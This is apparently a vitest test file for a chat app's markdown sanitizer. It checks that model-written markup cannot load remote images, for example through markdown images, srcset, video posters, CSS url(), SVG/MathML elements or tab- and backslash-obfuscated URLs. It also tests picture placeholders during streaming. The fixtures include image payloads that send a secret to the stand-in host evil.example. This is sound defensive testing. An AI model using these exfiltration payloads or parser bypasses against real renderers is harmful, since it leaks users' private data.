import { describe, expect, it } from "vitest";

import { loadScripts } from "./helpers/appWindow.mjs";

function boot() {
  return loadScripts([
    "static/vendor/marked/12.0.2/marked.min.js",
    "static/vendor/dompurify/3.4.17/dist/purify.min.js",
    "static/js/markdown-stream.js",
  ]);
}

function render(markdown) {
  const { window, document } = boot();
  const output = document.createElement("div");
  window.injectMarkdown(output, markdown, []);
  return output;
}

describe("untrusted model markup cannot load remote resources on render", () => {
  it("replaces remote markdown images with a visible note", () => {
    const output = render("Summary ![x](https://evil.example/p?d=secret) end");
    expect(output.querySelector("img")).toBeNull();
    expect(output.innerHTML).not.toContain("evil.example");
    expect(output.textContent).toContain("[Image not loaded: x]");
    // A web address is a remote image, not a file of the agent's VM.
    expect(output.querySelector(".blocked-remote-image").classList.contains("is-local-ref")).toBe(false);
  });

  // An agent that names its shared picture as an image (a file name or VM
  // path): the answer whose pictures the app shows hides this note (CSS).
  it("marks an image that names a file instead of a web address", () => {
    const output = render("![Bunny](hasen_bild.png) ![Chart](sandbox:/mnt/data/chart.png) ![Web](//cdn.example/x.png)");
    const notes = [...output.querySelectorAll(".blocked-remote-image")];
    expect(notes.map(note => note.classList.contains("is-local-ref"))).toEqual([true, true, false]);
    // In a sentence it keeps its line; alone, its line goes with it.
    expect(output.querySelector(".local-ref-line")).toBeNull();
    const alone = render("![Bunny](hasen_bild.png)\n\nHere is your bunny.");
    expect(alone.querySelector("p.local-ref-line .is-local-ref")).not.toBeNull();
    expect(alone.querySelectorAll(".local-ref-line")).toHaveLength(1);
    expect(output.querySelector("img")).toBeNull();
  });

  it("strips raw HTML images, srcset, media and style blocks", () => {
    const output = render([
      '<img src="//evil.example/a">',
      '<img src="data:image/png;base64,AAAA" srcset="https://evil.example/b 2x">',
      '<video poster="https://evil.example/c"><source src="https://evil.example/d"></video>',
      '<style>p{background:url(https://evil.example/e)}</style>',
      '<span style="background-image:url(https://evil.example/f)">text</span>',
    ].join("\n\n"));
    expect(output.innerHTML).not.toContain("evil.example");
    expect(output.querySelector('img[src^="data:image/png"]')).not.toBeNull();
    expect(output.textContent).toContain("text");
  });

  it("blocks a remote image hidden behind the URL parser or in SVG and MathML", () => {
    const output = render([
      // Tab, newline and backslash: the browser reads all three as //host.
      '<img src="/&#9;/evil.example/tab">',
      '<img src="/&#10;/evil.example/newline">',
      '<img src="/\\evil.example/backslash">',
      '<svg><image href="https://evil.example/image"></image></svg>',
      '<svg><image xlink:href="https://evil.example/xlink"></image></svg>',
      '<svg><filter><feImage href="https://evil.example/feimage"></feImage></filter></svg>',
      '<math><mglyph src="https://evil.example/mglyph"></mglyph></math>',
      '<img src="/static/own.png" alt="own">',
    ].join("\n\n"));
    expect(output.innerHTML).not.toContain("evil.example");
    expect(output.querySelector('img[src="/static/own.png"]')).not.toBeNull();
  });

  it("blocks a remote image before its node reaches the page document", () => {
    const { window, document } = boot();
    const adopt = document.adoptNode.bind(document);
    const adopted = [];
    // An <img> starts loading once it belongs to the page, even detached.
    document.adoptNode = node => {
      adopted.push(Boolean(node.querySelector?.('img[src*="evil.example"]')));
      return adopt(node);
    };
    const output = document.createElement("div");
    window.injectMarkdown(output, '![x](https://evil.example/p?d=secret) <img src="https://evil.example/a">', []);
    expect(adopted.length).toBeGreaterThan(0);
    expect(adopted.every(remote => !remote)).toBe(true);
    expect(output.querySelector("img")).toBeNull();
  });

  // 2026-10-31: the agent places a picture it showed in its text.
  it("turns a placed picture into an empty place that loads nothing", () => {
    const output = render("Intro.\n\n![The tower at night](picture:p2)\n\nText ![x](picture:f1) on.\n\n![y](picture:bad:ref)");
    const line = output.querySelector(".md-picture-line");
    expect(line.tagName).toBe("DIV");
    expect(line.previousElementSibling.textContent).toBe("Intro.");
    expect([...line.children].map(place => [place.className, place.dataset.picture, place.childNodes.length]))
      .toEqual([["md-picture", "p2", 0]]);
    // In a sentence it keeps its paragraph.
    expect(output.querySelector('p > .md-picture[data-picture="f1"]')).not.toBeNull();
    // Anything else is an image like any other: a note, never a place.
    expect(output.querySelectorAll(".md-picture")).toHaveLength(2);
    expect(output.querySelector("img")).toBeNull();
    expect(output.textContent).not.toContain("The tower at night");
  });

  it("keeps a filled place and what it holds through the next render", () => {
    const { window, document } = boot();
    const output = document.createElement("div");
    const text = "Intro.\n\n![The tower](picture:p2)\n\nMore.";
    window.injectMarkdown(output, text, []);
    const place = output.querySelector(".md-picture");
    const figure = document.createElement("figure");
    place.append(figure);
    window.morphMarkdown(output, text + " And more.");
    expect(output.querySelector(".md-picture")).toBe(place);
    expect(place.firstChild).toBe(figure);
    // Another picture there is another place.
    window.morphMarkdown(output, text.replace("p2", "p3"));
    expect(output.querySelector(".md-picture").dataset.picture).toBe("p3");
    expect(output.querySelector(".md-picture").childNodes.length).toBe(0);
  });

  it("shows no raw image marks while a placed picture streams in", () => {
    const { window, document } = boot();
    const output = document.createElement("div");
    for (const shown of ["Intro.\n\n![The tow", "Intro.\n\n![The tower](pic", "Intro.\n\n![The tower](picture:p2"]) {
      window.renderMarkdownStream(output, shown);
      expect(output.textContent.trim()).toBe("Intro.");
    }
    window.renderMarkdownStream(output, "Intro.\n\n![The tower](picture:p2)");
    expect(output.querySelector('.md-picture[data-picture="p2"]')).not.toBeNull();
    expect(output.textContent.trim()).toBe("Intro.");
  });

  it("keeps ordinary links clickable", () => {
    const output = render("[Source](https://example.org/page)");
    expect(output.querySelector("a")?.getAttribute("href")).toBe("https://example.org/page");
  });
});
